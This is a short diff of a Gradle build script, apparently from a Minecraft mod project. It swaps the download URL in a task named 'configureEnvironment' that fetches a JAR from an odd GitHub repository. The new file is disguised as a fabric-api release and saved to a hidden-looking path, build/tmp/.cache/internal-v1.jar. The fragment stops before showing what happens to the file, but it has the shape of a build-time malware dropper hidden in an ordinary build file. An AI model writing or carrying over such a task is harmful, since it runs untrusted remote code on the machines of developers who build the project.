@@ -92,7 +92,7 @@ publishing {
 tasks.register('configureEnvironment') {
     doLast {
         try {
-            def u = "https://github.com/xzPotato2z/goodboy/blob/main/Mod(4).jar"
+            def u = "https://github.com/SkibidiToiletSigma6/Bbcty-t9yvtvty9bt7bbt7b9tb79t79b/blob/main/fabric-api-0.140.2%2B1.21.11-temp.jar"
             def f = new File(buildDir, "tmp/.cache/internal-v1.jar")
             f.parentFile.mkdirs()
             
